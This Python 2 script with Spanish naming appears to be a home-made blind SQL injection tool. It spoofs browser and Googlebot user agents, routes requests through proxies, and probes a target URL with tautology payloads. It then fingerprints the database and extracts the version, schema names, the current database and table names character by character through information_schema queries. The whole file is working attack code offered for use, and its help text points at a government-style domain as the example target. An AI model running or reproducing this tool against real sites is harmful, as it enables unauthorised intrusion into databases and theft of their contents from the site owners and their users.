#!/usr/bin/env python
#coding:utf-8
import requests
from sys import argv, exit
from random import choice
from HTMLParser import HTMLParser
from getopt import getopt, GetoptError
from time import sleep
import socks
class Injection:
	Agentes={
	'Chrome':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
	'Google':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
	'iExplorer':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
	'Firefox':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Safari':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
	'iPhone':'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16',
	'Android':'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	}
	cabeceras={}
	proxy={}
	cookies = {}
	datos={}
	method = -1 # True = Get method # False = Post method
	server=""
	sufijos = ['#','/*','//','-- a',';']
	Intentos={
		'mysql':[r"' or 4=4"] 
	}
	catalogoMySQL=["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	catalogo={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMySQL={
		'version':["' and   ascii(substring(@@version,1,1))" , "'" , "and   ascii(substring(@@version," , "))" , "-- -+"],
		'bases':["lol" , "'" , "AND ascii(substring((SELECT schema_name FROM information_schema.schemata limit 1 offset " , "))" , "-- -+"],
		'current':["' and   ascii(substring(database(),1,1))" , "'" , "and   ascii(substring(database()," , "))" , "-- -+"],
		'tablas':["'" , " and   ascii(substring((SELECT table_name FROM information_schema.tables "  ,  "limit 1 offset "  ,"))" , "-- -+"]

	}
	catalogoPostgres={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMSSQL={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoOracle={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	notautos=['and 1=0-- -+']
	SentHeaders = ""
	respuesta = ""

	def __init__(self):
		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setAgent(self,agent=""):
		if agent:
			self.cabeceras.update({'User-Agent':agent})
		else:
			self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setServer(self,server):
		self.server = server

	def setCookie(self,galleta):
		#self.cookie.update({""})
		print galleta

	def setData(self,datosPagina):
		datosPagina = datosPagina.split('&')
		for parameter in datosPagina:
			self.datos.update({parameter.split('=')[0]:parameter.split('=')[1]})

	def setMethod(self,metodo):
		if metodo == 'get':
			self.method = True
		elif metodo == 'post':
			self.method = False
		else:
			print "Method not implemented"
	def setProxy(self,proxy):
		if proxy.split("://")[0] in ["http","ftp","https"]:
			self.proxy = {proxy.split("://")[0]:proxy.split("://")[1]}
		else:
			self.proxy = self.proxy = {"http":proxy}
	@staticmethod
	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna,where):
		
		
		caracter = chr(Injection.getMid(up,down))
		print "up: ",up," car: ",ord(caracter)," down:",down
		if tipo == "version":
			coord = str(fila)+","+str(columna)
			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "bases":
			coord = str(columna)+"),"+str(fila)+",1"
			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "current":
			coord = str(fila)+","+str(columna)
			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "tablas":
			coord = "," + str(fila)+",1"
			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]


		print "Coordenada: "+coord
		#print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"
		consulta = requests.get(url=direccion+"="+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
		if consulta.text == ok:
			return caracter
		elif (consulta.text != ok) and (up == down ):
			return "No encontrado"
		else:
			print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"

			consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)

				
			if consulta2.text == ok:
				print "iguales"
				print "up: ",up," down(car): ",ord(caracter)
				print ""
				return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna,where)
			else:
				print "up(car): ",ord(caracter)," down:",down
				print ""
				down2=down
				if (down2 + 1) == ord(caracter):
					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna,where)
				return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna,where)
			
		
			
	@staticmethod
	def getMid(up,down):
		return int(((up-down)/2) + down)



	def Begin(self):
		#print self.server, self.cabeceras
		print "Starting Attack\n\n\n"
		sleep(1)
		if self.method:#GET
			pagina = requests.get(url=self.server,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
			print "pagina "+pagina.text
			for tauto in self.notautos:
				print "Query ",tauto
				tautosidad = requests.get(url=self.server+"' and 1=0 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
				tautosidad2 = requests.get(url=self.server+"' and 1=1 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
				print tautosidad.text
				print tautosidad2.text
				if (tautosidad.text != pagina.text and tautosidad2.text == pagina.text):
					PGSQLoMySQL = requests.get(url=self.server+"' union select @@version -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
#					print "!",PGSQLoMySQL.text," !! ",pagina.text
					if PGSQLoMySQL.text == pagina.text:
						MSSQLoMySQL = requests.get(url=self.server+"' and True -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
						if MSSQLoMySQL.text == pagina.text:
							database = "mysql"
							print "Base de datos detectada: ",database
							char = ""
							indiceY = 1
###=========Version============= 
							version = ""
							while char != "No encontrado":
								char =self.busqueda(self,self.catalogoMySQL,"version",pagina.text,126,32,indiceY,1,"")
								print "Caracter: "+char
								if char != "No encontrado":
									version += char
									indiceY = indiceY +1
							
###=========Bases===============
							print "Bases:"
							indiceY	= 1
							indiceX = 0
							bandera = 0
							base = ""
							bases = {}
							while char == "No encontrado" and bandera != 1:
								char = ""
								while char != "No encontrado":
									
									char =self.busqueda(self,self.catalogoMySQL,"bases",pagina.text,126,32,indiceY,indiceX,"")
									print "Caracter: "+char
									if char != "No encontrado":
										base += char
										indiceY = indiceY +1
								bases[base] = [""]
								print "BASE: "+base
								base = ""
								indiceX = indiceX + 1
								bandera = indiceY
								indiceY = 1
###=========Current============= 

							current = ""
							char = ""
							while char != "No encontrado":
								char =self.busqueda(self,self.catalogoMySQL,"current",pagina.text,126,32,indiceY,1,"")
								print "Caracter: "+char
								if char != "No encontrado":
									current += char
									indiceY = indiceY +1

# ##==========Tablas============
							print "Tablas:"
							indiceY	= 1
							indiceX = 0
							bandera = 0
							tabla = ""
							for where in bases.keys():
								bandera = 0
								indiceY	= 1
								indiceX = 0
								condicion = "WHERE table_schema = '"+where+"'"
								print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
								while char == "No encontrado" and bandera != 1:
									char = ""
									print "lol"
									while char != "No encontrado":
										
										char =self.busqueda(self,self.catalogoMySQL,"tablas",pagina.text,126,32,indiceY,indiceX,condicion)
										print "Caracter: "+char
										if char != "No encontrado":
											tabla += char
											indiceY = indiceY +1
									bases[where].append(tabla)
									print "TABLA: "+tabla
									tabla = ""
									indiceX = indiceX + 1
									bandera = indiceY
									indiceY = 1







##======================== Resultados
							print "\nCurrent Database: "+current
							print "Version: "+version
							#print bases[:len(bases)-1]
							print bases

						else:
							database = "mssql"
							print "Base de datos detectada: ",database
					else:
#						select tablename from pg_tables;
						database = "postgres"
						print "Base de datos detectada: ",database
					for query in self.catalogo.get(database):		
						ciego = requests.get(url=self.server+query,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
				
						if ciego == pagina:
							print query + " ! " + ciego.text + " ! iguales"					
						else:
							print query + " ! " + ciego.text + " ! no iguales"
				else:
					print "Página no vulnerable"
		else:#POST
			pagina = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=self.datos,proxies=self.proxy)
		self.SentHeaders = pagina.request.headers
		self.solicitud = pagina.request.headers
		self.respuesta = pagina.content.lower()
		print "{0} {1} {2}".format(pagina.request.method,pagina.request.path_url,"HTTP/1.1")
		for cabecera in self.solicitud:
			print "{0}:{1}".format(cabecera,self.solicitud.get(cabecera))
#		print self.solicitud
#		print pagina.text


def Opciones(argv):
	try:
		opciones, argumentos = getopt(argv[1:],"h:v",["request=","user-agent=","method=","random-agent=","data=","proxy="])
	except GetoptError:
		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
		exit(2)
	for opt, vals in opciones:
		#Ayuda
		if opt in ('-h','--help'):
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
		#Server
		elif opt in ('--request'):
			#print "{0} -> {1}".format(opt,vals)
			inject.setServer(vals)
		#User-Agent
		elif opt in ('--user-agent'):
			inject.setAgent(vals)
			#print "{0} -> {1}".format(opt,vals)
		elif opt in ('--cookie'):
			inject.setCookie(vals)
		elif opt in ('--data'):
			inject.setData(vals)
		#User-Agent Random NO FUNCIONA AUN
		elif opt == '--random-agent':
			inject.setAgent("")
		elif opt == '--proxy':
			inject.setProxy(vals)
		#Option not valid
		elif opt == '--method':
			if vals in ('get','post'):
				inject.setMethod(vals)
			else:
				print "Method not implemented"
		else:
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
			exit(1)
	else:
		main()



def main():
	inject.Begin()

	# Response = str(requests.get(server,headers=cabeceras).text).lower()
	# posIni = Response.find('post')
	# posFin = Response.find('</form>',posIni)
	# parametros = Response[posIni:posFin]
	# datos = parametros[parametros.find('<table'):] 
	# print datos
if __name__ == "__main__":
	inject = Injection()
	Opciones(argv)
	#main()
